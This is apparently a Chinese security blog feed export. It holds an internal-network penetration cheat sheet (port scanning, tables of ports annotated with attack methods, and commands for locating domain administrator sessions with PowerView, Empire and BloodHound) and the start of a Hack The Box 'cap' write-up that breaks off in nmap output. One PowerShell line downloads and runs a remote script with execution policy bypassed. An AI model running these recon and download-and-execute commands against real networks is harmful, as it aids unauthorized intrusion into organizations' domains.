title="0x04.域内端口探测"></a>0x04.域内端口探测</h2><h3 id="01-scanlineTCP-UDP端口探测"><a href="#01-scanlineTCP-UDP端口探测" class="headerlink" title="01.scanlineTCP/UDP端口探测"></a>01.scanlineTCP/UDP端口探测</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanline.exe -h -t 22,80-89,110,389,1099,1433,2059,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O C:\Users\Administrator\Desktop\log.txt -p 10.10.10.1-254</span><br></pre></td></tr></table></figure><h3 id="02-telnet扫描"><a href="#02-telnet扫描" class="headerlink" title="02.telnet扫描"></a>02.telnet扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.10.10.10 22</span><br></pre></td></tr></table></figure><h3 id="03-metasploit端口扫描"><a href="#03-metasploit端口扫描" class="headerlink" title="03.metasploit端口扫描"></a>03.metasploit端口扫描</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set rhosts 192.168.1.1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="04-PowerSploit的Invoke-Portscan-ps1"><a href="#04-PowerSploit的Invoke-Portscan-ps1" class="headerlink" title="04.PowerSploit的Invoke-Portscan.ps1"></a>04.PowerSploit的Invoke-Portscan.ps1</h3><p><code>无文件扫描</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 10.10.10.0/24 -T 4 -ports &#x27;445,1433,8080,3389,80&#x27; -oA c:\user\administrator\desktop\res.txt&quot;</span><br></pre></td></tr></table></figure><h2 id="0x05-域内常见端口"><a href="#0x05-域内常见端口" class="headerlink" title="0x05.域内常见端口"></a>0x05.域内常见端口</h2><h3 id="01-文件共享服务端口"><a href="#01-文件共享服务端口" class="headerlink" title="01.文件共享服务端口"></a>01.文件共享服务端口</h3><table><thead><tr><th>端口号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>21、22、69</td><td>FTP/TFTP文件传输协议</td><td>允许匿名的上传、下载爆破和嗅探操作</td></tr><tr><td>2049</td><td>NFS服务</td><td>配置不当</td></tr><tr><td>137、138、139</td><td>Netbiso/SAMBA服务</td><td>爆破、未授权访问、远程代码执行</td></tr><tr><td>389</td><td>LDAP目录访问协议</td><td>注入、允许匿名访问、弱口令</td></tr><tr><td>135</td><td>DCOM/RPC服务</td><td>RPC通信桥梁</td></tr><tr><td>445</td><td>SMB</td><td>共享文件夹(MS17-010),IPC$服务</td></tr></tbody></table><h3 id="02-远程连接服务端口"><a href="#02-远程连接服务端口" class="headerlink" title="02.远程连接服务端口"></a>02.远程连接服务端口</h3><table><thead><tr><th align="left">端口号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td align="left">22</td><td>SSH远程连接</td><td>爆破、SSH隧道及内网代理转发、文件传输</td></tr><tr><td align="left">23</td><td>Telnet远程连接</td><td>爆破、嗅探、弱口令</td></tr><tr><td align="left">3389</td><td>RDP远程桌面连接</td><td>Shift后门（Windows Server 2003以下版本）、爆破</td></tr><tr><td align="left">5900</td><td>VNC</td><td>弱口令爆破</td></tr><tr><td align="left">5632</td><td>PcAnywhere服务</td><td>抓取密码、代码执行</td></tr></tbody></table><h3 id="03-Web应用服务端口"><a href="#03-Web应用服务端口" class="headerlink" title="03.Web应用服务端口"></a>03.Web应用服务端口</h3><table><thead><tr><th align="left">端口号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td align="left">80、443、8080</td><td>常见的Web服务端口</td><td>Web攻击、爆破、对应服务器版本漏洞</td></tr><tr><td align="left">7001、7002</td><td>Weblogic控制台</td><td>Java反序列化、弱口令</td></tr><tr><td align="left">8080、8089</td><td>JBoss/Resin/Jetty/Jenkins</td><td>反序列化、控制台弱口令</td></tr><tr><td align="left">9090</td><td>WebSphere控制台</td><td>Java反序列化、弱口令</td></tr><tr><td align="left">4848</td><td>GlassFish控制台</td><td>弱口令</td></tr><tr><td align="left">1352</td><td>Lotus Domino邮件服务</td><td>弱口令、信息泄露、爆破</td></tr><tr><td align="left">10000</td><td>webmin控制面板</td><td>弱口令</td></tr></tbody></table><h3 id="04-数据库服务端口"><a href="#04-数据库服务端口" class="headerlink" title="04.数据库服务端口"></a>04.数据库服务端口</h3><table><thead><tr><th>端口号</th><th>端口说明</th><th><strong>使用说明</strong></th></tr></thead><tbody><tr><td>3306</td><td>MySQL数据库</td><td>注入、提权、爆破</td></tr><tr><td>1433</td><td>MSSQL数据库</td><td>注入、提权、SA弱口令、爆破</td></tr><tr><td>1521</td><td>Oracle数据库</td><td>TNS爆破、注入、反弹Shell</td></tr><tr><td>5432</td><td>PostgreSQL数据库</td><td>爆破、注入、弱口令</td></tr><tr><td>27017、27018</td><td>MongoDB数据库</td><td>爆破、未授权访问</td></tr><tr><td>6379</td><td>Redis数据库</td><td>未授权访问、弱口令</td></tr><tr><td>5000</td><td>Sysbase/DB2数据库</td><td>爆破、注入</td></tr></tbody></table><h3 id="05-邮件服务器端口"><a href="#05-邮件服务器端口" class="headerlink" title="05.邮件服务器端口"></a>05.邮件服务器端口</h3><table><thead><tr><th>端口号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>25</td><td>SMTP邮件服务</td><td>邮件伪造</td></tr><tr><td>110</td><td>POP3协议</td><td>爆破、嗅探</td></tr><tr><td>143</td><td>IMAP协议</td><td>爆破</td></tr></tbody></table><h3 id="06-网络常见协议端口"><a href="#06-网络常见协议端口" class="headerlink" title="06.网络常见协议端口"></a>06.网络常见协议端口</h3><table><thead><tr><th>端口号</th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>53</td><td>DNS域名系统</td><td>允许区域传送、DNS劫持、缓存投毒、欺骗</td></tr><tr><td>67、68</td><td>DHCP服务</td><td>劫持、欺骗</td></tr><tr><td>161</td><td>SNMP协议</td><td>爆破、搜集目标内网信息</td></tr></tbody></table><h3 id="07-特殊服务端口"><a href="#07-特殊服务端口" class="headerlink" title="07.特殊服务端口"></a>07.特殊服务端口</h3><table><thead><tr><th><strong>端口号</strong></th><th>端口说明</th><th>使用说明</th></tr></thead><tbody><tr><td>2181</td><td>ZooKeeper服务</td><td>未授权访问</td></tr><tr><td>8069</td><td>Zabbix服务</td><td>远程执行、SQL注入</td></tr><tr><td>9200、9300</td><td>Elasticsearch服务</td><td>远程执行</td></tr><tr><td>11211</td><td>Memchached服务</td><td>未授权访问</td></tr><tr><td>512、513、514</td><td>Linux rexec服务</td><td>爆破、远程登录</td></tr><tr><td>873</td><td>rsync服务</td><td>匿名访问、文件上传</td></tr><tr><td>3690</td><td>SVN服务</td><td>svn泄露、未授权访问</td></tr><tr><td>50000</td><td>SAP Management Console</td><td>远程执行</td></tr><tr><td>88</td><td>Kerberos服务</td><td>监听KDC票据请求，票据伪造</td></tr><tr><td>5985</td><td>WinRM</td><td>HTTP/HTTPS监听</td></tr></tbody></table><h2 id="0x06-定位域管理员"><a href="#0x06-定位域管理员" class="headerlink" title="0x06.定位域管理员"></a>0x06.定位域管理员</h2><p><code>两种方法:管理员日志与登入会话，主要是会话</code></p><h3 id="01-查看本机资源使用情况"><a href="#01-查看本机资源使用情况" class="headerlink" title="01.查看本机资源使用情况"></a>01.查看本机资源使用情况</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><h3 id="02-psloggedon-exe"><a href="#02-psloggedon-exe" class="headerlink" title="02.psloggedon.exe"></a>02.psloggedon.exe</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psloggedon.exe \\10.10.10.10</span><br></pre></td></tr></table></figure><blockquote><p>通过注册表HKEY_USERS的key值查询谁登入过</p></blockquote><p><code>参数</code></p><table><thead><tr><th><strong>参数</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>–</td><td>显示支持的选项和用于输出值的度量单位。</td></tr><tr><td>-l</td><td>仅显示本地登录，而不显示本地和网络资源登录。</td></tr><tr><td>-x</td><td>不显示登录时间。</td></tr><tr><td>\\computername</td><td>指定要为其列出登录信息的计算机的名称。</td></tr><tr><td>username</td><td>指定用户名，在网路中搜索该用户登入的计算机</td></tr></tbody></table><h3 id="03-PVEFindADUser-exe"><a href="#03-PVEFindADUser-exe" class="headerlink" title="03.PVEFindADUser.exe"></a>03.PVEFindADUser.exe</h3><blockquote><p>用于查找活动目录用户登录位置，枚举域用户，查找在特定计算机上登录的用户，包括本地用户，通过RDP登录的用户，用于运行服务和计划任务的用户。运行该工具需要.NET Framework2.0环境，并且具备管理员权限。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVEFindADUser.exe --current</span><br></pre></td></tr></table></figure><h3 id="04-netview-exe"><a href="#04-netview-exe" class="headerlink" title="04.netview.exe"></a>04.netview.exe</h3><blockquote><p>使用WinAPI枚举系统，利用NetSessionEnum找寻登录会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录的用户。大部分功能不需要管理员权限。</p></blockquote><p><code>参数</code></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>-f filename.txt</td><td>指定一个文件以从中提取主机列表</td></tr><tr><td>-e filename.txt**</td><td>指定要排除的主机名文件</td></tr><tr><td>-d domain</td><td>指定要从中拉出主机列表的域，如果未指定，则使用当前域</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netview.exe -filenmae.txt &gt; res.txt</span><br></pre></td></tr></table></figure><h3 id="05-nmap的NSE脚本"><a href="#05-nmap的NSE脚本" class="headerlink" title="05.nmap的NSE脚本"></a>05.nmap的NSE脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smb-enum-domains.nse    #对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等</span><br><span class="line">smb-enum-groups.nse</span><br><span class="line">smb-enum-processes.nse    #获取主机进程</span><br><span class="line">smb-enum-services.nse</span><br><span class="line">smb-enum-sessions.nse    #获取用户登入会话</span><br><span class="line">smb-enum-shares.nse        #遍历远程主机的共享目录</span><br><span class="line">smb-enum-users.nse        #用户权限不够可以使用它对域控进行扫描</span><br><span class="line">smb-flood.nse</span><br><span class="line">smb-ls.nse</span><br><span class="line">smb-mbenum.nse</span><br><span class="line">smb-os-discovery.nse    #进行信息收集</span><br></pre></td></tr></table></figure><h3 id="06-PowerView脚本"><a href="#06-PowerView脚本" class="headerlink" title="06.PowerView脚本"></a>06.PowerView脚本</h3><p><code>扫描目标用户集，不需要管理权限</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\powerview.ps1; Invoke-UserHunter&#125;&quot;</span><br></pre></td></tr></table></figure><h3 id="07-Empire的user-hunter模块"><a href="#07-Empire的user-hunter模块" class="headerlink" title="07.Empire的user_hunter模块"></a>07.Empire的user_hunter模块</h3><p><code>查找域管理员登入的机器</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule powershell/situational_awareness/network/powerview/user_hunter</span><br></pre></td></tr></table></figure><h2 id="0x07-进程查询"><a href="#0x07-进程查询" class="headerlink" title="0x07.进程查询"></a>0x07.进程查询</h2><h3 id="01-netsess-exe"><a href="#01-netsess-exe" class="headerlink" title="01.netsess.exe"></a>01.netsess.exe</h3><p><code>会话查询</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsess.exe -h</span><br></pre></td></tr></table></figure><h3 id="02-交叉引用域管理员列表与活动会话列表"><a href="#02-交叉引用域管理员列表与活动会话列表" class="headerlink" title="02.交叉引用域管理员列表与活动会话列表"></a>02.交叉引用域管理员列表与活动会话列表</h3><blockquote><p>域控添加到dcs.txt，域管理员添加到admins.txt，与netsess在同一目录</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; session.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type session.txt | @findstr /I %a</span><br></pre></td></tr></table></figure><h3 id="03-查询远程系统中运行的任务"><a href="#03-查询远程系统中运行的任务" class="headerlink" title="03.查询远程系统中运行的任务"></a>03.查询远程系统中运行的任务</h3><p><code>首先获取域管理员列表</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><code>将目标系统添加到ips.txt，域管理员添加到admins.txt，运行以下脚本(当前计算机IP)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt;output.txt &amp;&amp; for /F %n in (admins.txt) do @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp;pause</span><br></pre></td></tr></table></figure><h3 id="04-利用Netbios查询会话"><a href="#04-利用Netbios查询会话" class="headerlink" title="04.利用Netbios查询会话"></a>04.利用Netbios查询会话</h3><blockquote><p>将目标系统添加到ips.txt，域管理员添加到admins.txt，运行以下脚本</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+]Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; for /F %n in (admins.txt) do @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure><p><code>使用nbtscan进行查询</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+]Checking %i &amp;&amp; nbtscan -f %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; for /F %n in (admins.txt) do @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure><h2 id="0x08-PowerShell收集域信息"><a href="#0x08-PowerShell收集域信息" class="headerlink" title="0x08.PowerShell收集域信息"></a>0x08.PowerShell收集域信息</h2><p><code>Powershell的四种权限</code></p><blockquote><p>Restricted：默认设置，不允许执行任何脚本。</p><p>Allsigned：只能运行经过证书验证的脚本。</p><p>Unrestircted：权限最高，允许执行任何脚本。</p><p>RemoteSigned：对本地脚本不进行限制，对来自网络的脚本必须验证其签名。</p></blockquote><h3 id="01-权限相关"><a href="#01-权限相关" class="headerlink" title="01.权限相关"></a>01.权限相关</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-ExecutionPolicy        #查看权限</span><br><span class="line">Set-ExecutionPolicy UnRestricted    #修改权限</span><br></pre></td></tr></table></figure><h3 id="02-导入powerview-ps1"><a href="#02-导入powerview-ps1" class="headerlink" title="02.导入powerview.ps1"></a>02.导入powerview.ps1</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br></pre></td></tr></table></figure><h3 id="03-常用命令"><a href="#03-常用命令" class="headerlink" title="03.常用命令"></a>03.常用命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PowerView的常用命令如下：</span><br><span class="line">Get-NetDomain：获取当前用户所在的域。</span><br><span class="line">Get-NetUser：获取所有用户的详细信息。</span><br><span class="line">Get-NetDomainController：获取所有域控制器的信息。</span><br><span class="line">Get-NetComputer：获取域内所有机器的详细信息。</span><br><span class="line">Get-NetOU：获取域中的OU信息。</span><br><span class="line">Get-NetGroup：获取所有域内组成员的信息。</span><br><span class="line">Get-NetFileServer：根据SPN获取当前域使用的文件服务器信息。</span><br><span class="line">Get-NetShare：获取当前域内所有的网络共享信息。</span><br><span class="line">Get-NetSession：获取指定服务器的会话。</span><br><span class="line">Get-NetRDPSession：获取指定服务器的远程连接。</span><br><span class="line">Get-NetProcess：获取远程主机的进程。</span><br><span class="line">Get-UserEvent：获取指定用户的日志。</span><br><span class="line">Get-ADObject：获取活动目录的对象。</span><br><span class="line">Get-NetGPO：获取域内所有的组策略对象。</span><br><span class="line">Get-DomainPolicy：获取域默认策略或域控制器策略。</span><br><span class="line">Invoke-UserHunter：获取域用户登录的计算机信息及该用户是否有本地管理员权限。</span><br><span class="line">Invoke-ProcessHunter：通过查询域内所有的机器进程找到特定用户。</span><br><span class="line">Invoke-UserEventHunter：根据用户日志查询某域用户登录过哪些机器。</span><br></pre></td></tr></table></figure><h2 id="0x09-BloodHound域内分析工具"><a href="#0x09-BloodHound域内分析工具" class="headerlink" title="0x09.BloodHound域内分析工具"></a>0x09.BloodHound域内分析工具</h2><p><code>首先进行信息采集，然后导入分析即可</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe -c all</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-工作组信息收集&quot;&gt;&lt;a href=&quot;#0x01-工作组信息收集&quot; class=&quot;headerlink&quot; title=&quot;0x01.工作组信息收集&quot;&gt;&lt;/a&gt;0x01.工作组信息收集&lt;/h2&gt;&lt;h3 id=&quot;01-检测当前shell权限&quot;&gt;&lt;a href=&quot;#01-检测当前shell权限&quot; class=&quot;headerlink&quot; title=&quot;01.检测当前shell权限&quot;&gt;&lt;/a&gt;01.检测当前shell权限&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;whoami /user    #查看当前用户的SID&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;whoami /priv    #查看当前用户的安全权限&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;whoami /all&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;02-查看当前系统信息&quot;&gt;&lt;a href=&quot;#02-查看当前系统信息&quot; class=&quot;headerlink&quot; title=&quot;02.查看当前系统信息&quot;&gt;&lt;/a&gt;02.查看当前系统信息&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;systeminfo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;03-tcp-udp-网络连接状态&quot;&gt;&lt;a href=&quot;#03-tcp-udp-网络连接状态&quot; class=&quot;headerlink&quot; title=&quot;03.tcp/udp 网络连接状态&quot;&gt;&lt;/a&gt;03.tcp/udp 网络连接状态&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;netstat -nao&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="内网渗透测试" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="内网安全" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[cap]</title>
    <link href="https://lunamoore.github.io/2021/07/14/HTB-cap/"/>
    <id>https://lunamoore.github.io/2021/07/14/HTB-cap/</id>
    <published>2021-07-14T06:23:37.000Z</published>
    <updated>2021-07-14T06:30:37.958Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00.简述"></a>0x00.简述</h2><img src="/2021/07/14/HTB-cap/image-20210714122750156.png" class><a id="more"></a><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01.信息收集"></a>0x01.信息收集</h2><p><code>可以看到开放了21、21、80端口</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/cap]</span><br><span class="line">└─# ftp anonymous@10.10.10.245                                                                                                                             1 ⚙</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-14 00:34 EDT</span><br><span class="line">Nmap scan report for 10.10.10.245</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 992 closed ports</span><br><span class="line">PORT     STATE    SERVICE        VERSION</span><br><span class="line">21/tcp   open     ftp            vsftpd 3.0.3</span><br><span class="line">22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)</span><br><span class="line">|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)</span><br><span class="line">|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)</span><br><span class="line">80/tcp   open     http           gunicorn</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Content-Length: 193</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;title&gt;Bad Request&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;</span><br><span class="line">|     Invalid Request Line &amp;#x27;Invalid HTTP request line: &amp;#x27;&amp;#x27;&amp;#x27;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|     &lt;/html&gt;</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Server: gunicorn</span><br><span class="line">|     Date: Wed, 14 Jul 2021 04:39:13 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 19386</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html class=&quot;no-js&quot; lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Security Dashboard&lt;/title&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/png&quot; href=&quot;/static/images/icon/favicon.ico&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/font-awesome.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/themify-icons.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/metisMenu.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/owl.carousel.min.css&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/slicknav.min.css&quot;&gt;</span><br><span class="line">|     &lt;!-- amchar</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Server: gunicorn</span><br><span class="line">|     Date: Wed, 14 Jul 2021 04:39:14 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Allow: GET, HEAD, OPTIONS</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|   RTSPRequest: 